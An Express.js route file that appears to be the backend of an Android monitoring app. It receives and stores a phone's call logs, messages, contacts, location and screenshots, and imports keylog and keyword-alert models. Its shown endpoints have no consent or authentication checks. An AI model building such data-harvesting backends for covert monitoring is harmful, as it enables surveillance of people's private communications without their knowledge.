const express = require('express');
const router = express.Router();

const Device = require('../models/Device');
const CallLog = require('../models/CallLog');
const Message = require('../models/Message');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const BrowserHistory = require('../models/BrowserHistory');
const Screenshot = require('../models/Screenshot');
const Keylog = require('../models/Keylog');
const KeywordAlert = require('../models/KeywordAlert');
const Geofence = require('../models/Geofence');
const AppUsage = require('../models/AppUsage');

// ✅ Helper: find device safely
const findDevice = async (deviceId) => {
  if (!deviceId) return null;

  let device = await Device.findOne({ deviceId });
  if (!device) return null;

  device.lastSeen = new Date();
  await device.save();

  return device;
};

// ================= REGISTER DEVICE =================
router.post('/register', async (req, res) => {
  const { deviceId, deviceName, deviceModel, androidVersion, userId } = req.body;

  if (!deviceId) {
    return res.status(400).json({ success: false, message: 'deviceId required' });
  }

  try {
    let device = await Device.findOne({ deviceId });

    if (!device) {
      device = new Device({ userId, deviceId, deviceName, deviceModel, androidVersion });
      await device.save();
    } else {
      device.lastSeen = new Date();
      await device.save();
    }

    res.json({ success: true, deviceId: device._id });

  } catch (err) {
    console.error('Register Device Error ❌:', err.message);

    res.status(500).json({ success: false, message: 'Server Error' });
  }
});

// ================= CALL LOGS =================
router.post('/calls', async (req, res) => {
  const { deviceId, calls } = req.body;

  if (!calls || !Array.isArray(calls)) {
    return res.status(400).json({ success: false, message: 'calls array required' });
  }

  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false, message: 'Device not found' });

  try {
    // 🔥 performance boost
    const data = calls.map(call => ({ ...call, deviceId: device._id }));
    await CallLog.insertMany(data);

    res.json({ success: true });

  } catch (err) {
    console.error('Calls Error ❌:', err.message);

    res.status(500).json({ success: false, message: 'Server Error' });
  }
});

// ================= MESSAGES =================
router.post('/messages', async (req, res) => {
  const { deviceId, messages } = req.body;

  if (!messages || !Array.isArray(messages)) {
    return res.status(400).json({ success: false, message: 'messages array required' });
  }

  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false, message: 'Device not found' });

  try {
    const data = messages.map(msg => ({ ...msg, deviceId: device._id }));
    await Message.insertMany(data);

    res.json({ success: true });

  } catch (err) {
    console.error('Messages Error ❌:', err.message);

    res.status(500).json({ success: false, message: 'Server Error' });
  }
});

// ================= CONTACTS =================
router.post('/contacts', async (req, res) => {
  const { deviceId, contacts } = req.body;

  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });

  try {
    await Contact.deleteMany({ deviceId: device._id });

    if (contacts && contacts.length > 0) {
      const data = contacts.map(c => ({ ...c, deviceId: device._id }));
      await Contact.insertMany(data);
    }

    res.json({ success: true });

  } catch (err) {
    console.error('Contacts Error ❌:', err.message);

    res.status(500).json({ success: false, message: 'Server Error' });
  }
});

// ================= LOCATION =================
router.post('/location', async (req, res) => {
  const { deviceId, lat, lng, address, speed } = req.body;

  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });

  try {
    await Location.create({
      deviceId: device._id,
      lat,
      lng,
      address,
      speed,
      timestamp: new Date()
    });

    res.json({ success: true });

  } catch (err) {
    console.error('Location Error ❌:', err.message);

    res.status(500).json({ success: false, message: 'Server Error' });
  }
});

// ================= SCREENSHOT =================
router.post('/screenshot', async (req, res) => {
  const { deviceId, imageBase64 } = req.body;

  if (!imageBase64) {
    return res.status(400).json({ success: false, message: 'Image required' });
  }

  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });

  try {
    await Screenshot.create({
      deviceId: device._id,
      imageBase64,
      timestamp: new Date()
    });

    res.json({ success: true });

  } catch (err) {
    console.error('Screenshot Error ❌:', err.message);

    res.status(500).json({ success: false, message: 'Server Error' });
  }
});

// ================= (baaki routes same rahenge — optimized pattern follow karo) =================

module.exports = router;